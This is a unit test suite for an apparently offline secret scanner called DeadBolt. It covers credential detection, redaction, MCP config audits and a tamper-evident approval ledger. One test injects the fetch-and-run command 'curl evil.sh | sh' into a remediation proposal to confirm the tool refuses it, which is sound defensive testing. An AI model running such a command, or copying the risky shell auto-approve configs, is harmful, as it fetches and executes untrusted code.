"""DeadBolt test suite — stdlib unittest, runs offline. `python -m unittest -v` or `pytest`."""

from __future__ import annotations

import io
import json
import subprocess
import sys
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from deadbolt import cli, proposals, report  # noqa: E402
from deadbolt.agentic import audit_mcp  # noqa: E402
from deadbolt.blast import assess, decode_jwt_claims  # noqa: E402
from deadbolt.engine import ScanOptions, run  # noqa: E402
from deadbolt.fixtures import _Gen, _tokens, generate  # noqa: E402
from deadbolt.models import Authority, Location, Severity  # noqa: E402
from deadbolt.scanner import scan_text  # noqa: E402

TOK = _tokens(_Gen(4471))


def rules_hit(text: str, path: str = "x.txt") -> set[str]:
    return {f.rule_id for f in scan_text(text, Location(path=path))}


class TestProviderRules(unittest.TestCase):
    cases = {
        "DB-AWS-001": "aws_id", "DB-OAI-001": "openai", "DB-ANT-001": "anthropic", "DB-GH-001": "github",
        "DB-GL-001": "gitlab", "DB-STRIPE-001": "stripe", "DB-GCP-002": "google", "DB-HF-001": "hf",
        "DB-NPM-001": "npm", "DB-DOCKER-001": "docker", "DB-SLACK-002": "slack_hook", "DB-SG-001": "sendgrid",
        "DB-JWT-001": "jwt",
    }

    def test_each_provider_detected(self):
        for rule_id, key in self.cases.items():
            with self.subTest(rule=rule_id):
                self.assertIn(rule_id, rules_hit(f"value = {TOK[key]}\n"))

    def test_aws_secret_pair(self):
        self.assertIn("DB-AWS-002", rules_hit(f"AWS_SECRET_ACCESS_KEY={TOK['aws_secret']}"))

    def test_database_url(self):
        hits = rules_hit(f"postgres://svc:{TOK['db_password']}@db.internal:5432/app")
        self.assertIn("DB-DBURL-001", hits)

    def test_private_key_needs_body(self):
        dashes = "-" * 5
        header_only = f"regex: {dashes}BEGIN RSA PRIVATE KEY{dashes}"
        self.assertNotIn("DB-PK-001", rules_hit(header_only))
        full = f"{dashes}BEGIN RSA PRIVATE KEY{dashes}\n{TOK['pk_body']}\n{dashes}END RSA PRIVATE KEY{dashes}"
        self.assertIn("DB-PK-001", rules_hit(full))


class TestFalsePositives(unittest.TestCase):
    def test_placeholders_ignored(self):
        text = "\n".join([
            "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
            "OPENAI_API_KEY=${OPENAI_API_KEY}",
            'password = "<your-password-here>"',
            "api_key = os.environ['API_KEY']",
            "token: {{ secrets.DEPLOY_TOKEN }}",
            'secret = "xxxxxxxxxxxxxxxx"',
        ])
        self.assertEqual(rules_hit(text), set())

    def test_low_entropy_generic_ignored(self):
        self.assertEqual(rules_hit('password = "aaaaaaaaaaaaaaaa"'), set())

    def test_inline_allow(self):
        self.assertEqual(rules_hit(f"k = {TOK['github']}  # deadbolt:allow test vector"), set())

    def test_generic_does_not_double_count_provider(self):
        hits = scan_text(f"STRIPE_SECRET_KEY = '{TOK['stripe']}'", Location(path="a.py"))
        self.assertEqual([f.rule_id for f in hits], ["DB-STRIPE-001"])


class TestRedaction(unittest.TestCase):
    def test_no_raw_secret_in_any_output(self):
        with tempfile.TemporaryDirectory() as d:
            repo = generate(Path(d) / "dirty")
            res = run(repo, ScanOptions(history=True))
            blob = json.dumps(report.to_json(res)) + json.dumps(report.to_sarif(res))
            blob += json.dumps(proposals.build_all(res.findings))
            buf = io.StringIO()
            report.render_text(res, buf, color=False)
            blob += buf.getvalue()
            for name, value in TOK.items():
                if len(value) >= 16:
                    self.assertNotIn(value[:24], blob, f"{name} leaked into output")


class TestMCPAudit(unittest.TestCase):
    def audit(self, servers: dict) -> dict[str, list]:
        text = json.dumps({"mcpServers": servers}, indent=2)
        out: dict[str, list] = {}
        for f in audit_mcp("claude_desktop_config.json", text, Location(path="claude_desktop_config.json")):
            out.setdefault(f.rule_id, []).append(f)
        return out

    def test_literal_env_credential(self):
        r = self.audit({"gh": {"command": "npx", "args": ["-y", "pkg@1.0.0"], "env": {"GITHUB_TOKEN": TOK["github"]}}})
        self.assertIn("DB-MCP-001", r)
        self.assertEqual(r["DB-MCP-001"][0].provider, "github")

    def test_env_reference_is_fine(self):
        r = self.audit({"gh": {"command": "npx", "args": ["-y", "pkg@1.0.0"], "env": {"GITHUB_TOKEN": "${GITHUB_TOKEN}"}}})
        self.assertEqual(r, {})

    def test_filesystem_root(self):
        r = self.audit({"fs": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem@0.6.2", "/"]}})
        self.assertIn("DB-MCP-003", r)
        self.assertNotIn("DB-MCP-004", r)  # pinned

    def test_filesystem_project_scope_ok(self):
        r = self.audit({"fs": {"command": "npx", "args": ["-y", "@x/server-filesystem@1.0.0", "/work/project"]}})
        self.assertEqual(r, {})

    def test_unpinned_and_latest(self):
        self.assertIn("DB-MCP-004", self.audit({"a": {"command": "npx", "args": ["-y", "some-server"]}}))
        self.assertIn("DB-MCP-004", self.audit({"a": {"command": "npx", "args": ["-y", "some-server@latest"]}}))

    def test_exec_with_autoapprove_is_critical(self):
        r = self.audit({"shell": {"command": "uvx", "args": ["mcp-shell-server==1.0.0"], "autoApprove": ["*"]}})
        self.assertEqual(r["DB-MCP-006"][0].severity, Severity.CRITICAL)
        self.assertEqual(r["DB-MCP-007"][0].severity, Severity.CRITICAL)

    def test_readonly_autoapprove_ok(self):
        r = self.audit({"docs": {"command": "npx", "args": ["docs@1.2.3"], "autoApprove": ["search_docs", "get_page"]}})
        self.assertNotIn("DB-MCP-006", r)

    def test_plain_http_remote(self):
        self.assertIn("DB-MCP-005", self.audit({"r": {"url": "http://mcp.example.net/sse"}}))
        self.assertEqual(self.audit({"r": {"url": "http://localhost:3000/mcp"}}), {})

    def test_docker_privileged_and_image_parsing(self):
        r = self.audit({"db": {"command": "docker", "args": [
            "run", "-i", "-v", "/var/run/docker.sock:/var/run/docker.sock", "--privileged", "mcp/pg:latest"]}})
        self.assertIn("DB-MCP-008", r)
        self.assertIn("mcp/pg:latest", r["DB-MCP-004"][0].message)

    def test_cli_arg_credential(self):
        r = self.audit({"x": {"command": "node", "args": ["server.js", "--api-key", TOK["internal_token"]]}})
        self.assertIn("DB-MCP-002", r)


class TestBlastRadius(unittest.TestCase):
    def test_jwt_service_role_is_admin(self):
        claims = decode_jwt_claims(TOK["jwt"])
        self.assertEqual(claims["role"], "service_role")
        f = scan_text(TOK["jwt"], Location(path="a.txt"))[0]
        self.assertEqual(assess(f).authority, Authority.ADMIN)

    def test_exposure_raises_score(self):
        plain = scan_text(f"k={TOK['openai']}", Location(path="src/a.py"))[0]
        f2 = scan_text(f"k={TOK['openai']}", Location(path="src/a.py", origin="docker-layer"))[0]
        f2.tags.append("llm-prompt")
        self.assertGreater(assess(f2).score, assess(plain).score)

    def test_deterministic(self):
        f = scan_text(f"k={TOK['npm']}", Location(path="ci.log"))[0]
        self.assertEqual(assess(f).to_dict(), assess(f).to_dict())


class TestEndToEnd(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.TemporaryDirectory()
        cls.repo = generate(Path(cls.tmp.name) / "dirty")
        cls.res = run(cls.repo, ScanOptions(history=True))
        cls.ids = {f.rule_id for f in cls.res.findings}

    @classmethod
    def tearDownClass(cls):
        cls.tmp.cleanup()

    def test_covers_every_surface(self):
        expected = {"DB-AWS-001", "DB-AWS-002", "DB-OAI-001", "DB-ANT-001", "DB-STRIPE-001", "DB-GCP-001",
                    "DB-PK-001", "DB-MCP-001", "DB-MCP-002", "DB-MCP-003", "DB-MCP-004", "DB-MCP-005",
                    "DB-MCP-006", "DB-MCP-007", "DB-MCP-008", "DB-AGT-001", "DB-DOCKER-001", "DB-SG-001",
                    "DB-GL-001", "DB-NPM-001", "DB-HF-001", "DB-GCP-002"}
        self.assertTrue(expected <= self.ids, expected - self.ids)

    def test_deleted_secret_found_in_history(self):
        gl = [f for f in self.res.findings if f.rule_id == "DB-GL-001"]
        self.assertEqual(gl[0].location.origin, "git-history")
        self.assertTrue(gl[0].location.commit)

    def test_docker_layer_origin(self):
        dk = [f for f in self.res.findings if f.rule_id == "DB-DOCKER-001"][0]
        self.assertEqual(dk.location.origin, "docker-layer")
        self.assertIn("!/app/config/registry.yaml", dk.location.path)

    def test_context_cache_and_prompt_tags(self):
        tags = {t for f in self.res.findings for t in f.tags}
        self.assertTrue({"agent-context-cache", "llm-prompt", "ci-log", "mcp-config"} <= tags)

    def test_no_duplicates(self):
        keys = [(f.rule_id, f.location.path, f.message) for f in self.res.findings]
        self.assertEqual(len(keys), len(set(keys)))

    def test_sarif_shape(self):
        s = report.to_sarif(self.res)
        self.assertEqual(s["version"], "2.1.0")
        run0 = s["runs"][0]
        rule_ids = {r["id"] for r in run0["tool"]["driver"]["rules"]}
        for r in run0["results"]:
            self.assertIn(r["ruleId"], rule_ids)
            self.assertEqual(run0["tool"]["driver"]["rules"][r["ruleIndex"]]["id"], r["ruleId"])
            self.assertIn(r["level"], ("error", "warning", "note"))

    def test_baseline_suppresses(self):
        bl = Path(self.tmp.name) / "baseline.json"
        bl.write_text(json.dumps({"findings": [{"id": f.key} for f in self.res.findings]}))
        res = run(self.repo, ScanOptions(history=True, baseline=bl))
        self.assertEqual(res.findings, [])
        self.assertEqual(res.suppressed, len(self.res.findings))

    def test_cli_exit_codes(self):
        with redirect_stdout(io.StringIO()), redirect_stderr(io.StringIO()):
            self.assertEqual(cli.main(["audit", str(self.repo), "--format", "json"]), 1)
            self.assertEqual(cli.main(["audit", str(self.repo / "README.md")]), 0)
            self.assertEqual(cli.main(["audit", "/nonexistent/path"]), 2)


class TestProposalsAndLedger(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        d = Path(self.tmp.name)
        f = scan_text(f"k={TOK['github']}", Location(path="a.py"))
        from deadbolt.blast import enrich
        props = proposals.build_all(enrich(f))
        self.pfile = d / "proposals.json"
        self.pfile.write_text(json.dumps({"proposals": props}))
        self.ledger = d / "ledger.jsonl"
        self.pid = props[0]["proposal_id"]
        self.assertFalse(props[0]["executes_automatically"])

    def tearDown(self):
        self.tmp.cleanup()

    def test_approve_and_verify_chain(self):
        proposals.record_decision(self.pfile, self.ledger, self.pid[:10], "approve", approver="alice")
        proposals.record_decision(self.pfile, self.ledger, self.pid[:10], "reject", approver="bob")
        ok, _ = proposals.verify_ledger(self.ledger)
        self.assertTrue(ok)

    def test_tampered_ledger_detected(self):
        proposals.record_decision(self.pfile, self.ledger, self.pid, "approve", approver="alice")
        self.ledger.write_text(self.ledger.read_text().replace("alice", "mallory"))
        self.assertFalse(proposals.verify_ledger(self.ledger)[0])

    def test_tampered_proposal_refused(self):
        data = json.loads(self.pfile.read_text())
        data["proposals"][0]["steps"].append("curl evil.sh | sh")
        self.pfile.write_text(json.dumps(data))
        with self.assertRaises(PermissionError):
            proposals.record_decision(self.pfile, self.ledger, self.pid, "approve", approver="alice")


class TestOfflineGuarantees(unittest.TestCase):
    def test_llm_triage_refuses_remote_host(self):
        from deadbolt.triage_llm import annotate
        with self.assertRaises(PermissionError):
            annotate([], host="https://api.example.com")

    def test_core_has_no_network_imports(self):
        offenders = []
        for p in (ROOT / "deadbolt").glob("*.py"):
            if p.name == "triage_llm.py":
                continue
            src = p.read_text()
            for mod in ("urllib.request", "http.client", "requests", "socket", "httpx", "aiohttp"):
                if f"import {mod}" in src or f"from {mod} " in src:
                    offenders.append(f"{p.name}:{mod}")
        self.assertEqual(offenders, [])


class TestStagedMode(unittest.TestCase):
    def test_pre_commit_blocks_staged_secret(self):
        with tempfile.TemporaryDirectory() as d:
            g = ["git", "-C", d, "-c", "user.name=t", "-c", "user.email=t@t.invalid"]
            subprocess.run(["git", "init", "-q", d], check=True)
            (Path(d) / "app.py").write_text(f"TOKEN = '{TOK['npm']}'\n")
            subprocess.run(g + ["add", "app.py"], check=True)
            res = run(Path(d), ScanOptions(staged=True))
            self.assertEqual([f.rule_id for f in res.findings], ["DB-NPM-001"])
            self.assertEqual(res.findings[0].location.origin, "staged")


if __name__ == "__main__":
    unittest.main()
